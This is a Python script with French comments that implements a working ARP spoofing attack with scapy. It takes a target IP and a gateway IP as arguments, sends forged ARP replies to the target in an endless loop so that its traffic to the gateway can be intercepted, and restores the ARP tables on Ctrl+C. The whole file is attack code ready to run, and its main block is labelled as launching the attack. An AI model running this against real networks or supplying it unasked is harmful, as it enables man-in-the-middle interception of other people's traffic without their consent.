import time
import scapy.all as scapy
import argparse  # Pour accepter les paramètres d'IP via la ligne de commande

# Fonction pour obtenir l'adresse MAC d'une cible
def get_mac(target_ip):
    """
    Envoie une requête ARP pour obtenir l'adresse MAC d'une IP cible.
    """
    arp_request = scapy.ARP(pdst=target_ip)  # Construction de la requête ARP
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # Trame Ethernet pour diffusion
    answered_list = scapy.srp(broadcast / arp_request, timeout=1, verbose=False)[0]  # Envoi et réception

    if answered_list:  # Si une réponse est reçue
        return answered_list[0][1].hwsrc
    else:
        print(f"[!] Aucune réponse ARP pour l'IP {target_ip}.")
        return None

# Fonction pour envoyer des paquets ARP spoof
def spoof(target_ip, spoof_ip):
    """
    Envoie des paquets ARP falsifiés pour usurper une IP.
    """
    target_mac = get_mac(target_ip)  # Récupérer l'adresse MAC cible
    if not target_mac:  # Si aucune réponse ARP, arrêter
        print(f"[!] Impossible de continuer, adresse MAC introuvable pour {target_ip}.")
        return

    # Création du paquet ARP falsifié
    # L'adresse MAC de destination dans Ethernet doit être celle de la cible
    arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    ethernet_packet = scapy.Ether(dst=target_mac) / arp_packet

    print(f"[+] Spoofing démarré : {target_ip} pense que {spoof_ip} est une IP légitime.")
    while True:
        try:
            scapy.sendp(ethernet_packet, verbose=False)  # Envoi du paquet ARP encapsulé dans Ethernet
            print(f"[+] Paquet ARP envoyé à {target_ip} pour usurper {spoof_ip}")
            time.sleep(2)  # Pause de 2 secondes entre les paquets
        except KeyboardInterrupt:
            print("\n[+] CTRL+C détecté. Réinitialisation des tables ARP en cours...")
            restore(target_ip, spoof_ip)
            restore(spoof_ip, target_ip)
            print("[+] Tables ARP réinitialisées. Fermeture.")
            break

# Fonction pour restaurer les tables ARP originales
def restore(target_ip, real_ip):
    """
    Restaure les tables ARP des cibles à leur état initial.
    """
    target_mac = get_mac(target_ip)
    real_mac = get_mac(real_ip)
    if target_mac is None or real_mac is None:
        print(f"[!] Impossible de restaurer les tables ARP pour {target_ip} ou {real_ip}.")
        return

    # Création d'un paquet ARP légitime pour restaurer les tables ARP
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=real_ip, hwsrc=real_mac)
    scapy.send(packet, verbose=False, count=4)  # Envoi plusieurs fois pour assurer la restauration
    print(f"[+] Tables ARP restaurées pour {target_ip} et {real_ip}.")

# Fonction pour accepter des arguments via la ligne de commande
def parse_arguments():
    """
    Utilise argparse pour accepter les arguments de la ligne de commande.
    """
    parser = argparse.ArgumentParser(description="Script d'ARP Spoofing.")
    parser.add_argument("target_ip", help="Adresse IP de la cible à spoofer")
    parser.add_argument("gateway_ip", help="Adresse IP de la passerelle (routeur)")
    return parser.parse_args()

# Lancer l'attaque
if __name__ == "__main__":
    try:
        # Récupérer les IP à partir des arguments de ligne de commande
        args = parse_arguments()
        target_ip = args.target_ip  # IP de la cible
        gateway_ip = args.gateway_ip  # IP de la passerelle (routeur)
        spoof(target_ip, gateway_ip)  # Lancer le spoofing
    except KeyboardInterrupt:
        print("\n[!] Interruption détectée. Exécution terminée.")

